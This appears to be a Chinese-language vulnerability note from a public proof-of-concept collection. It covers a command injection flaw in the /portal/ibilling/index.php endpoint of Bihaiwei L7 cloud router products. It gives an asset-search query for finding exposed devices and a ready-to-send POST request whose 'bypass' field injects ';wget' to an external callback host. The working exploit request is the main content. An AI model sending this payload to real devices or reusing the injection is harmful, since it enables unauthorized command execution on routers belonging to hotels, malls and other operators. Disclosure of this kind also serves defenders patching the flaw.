# 碧海威 L7多款产品index存在命令执行漏洞

# 一、漏洞简介
碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品index存在命令执行漏洞

# 二、影响版本
+ 碧海威 L7云路由

# 三、资产测绘
```plain
product="碧海威科技-L7云路由"
```

![1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d.png](./img/5VV9Gb23QQkaNIBN/1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d-055453.png)

# 四、漏洞复现
```plain
POST /portal/ibilling/index.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

{"type":5,"version":2,"bypass":";wget sadvlgapra.dgrh3.cn"}
```

![1717873439881-6561c715-975f-49c4-a47f-5a787180f384.png](./img/5VV9Gb23QQkaNIBN/1717873439881-6561c715-975f-49c4-a47f-5a787180f384-400658.png)



> 更新: 2024-06-27 09:15:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ayahigrv4qhbtgph>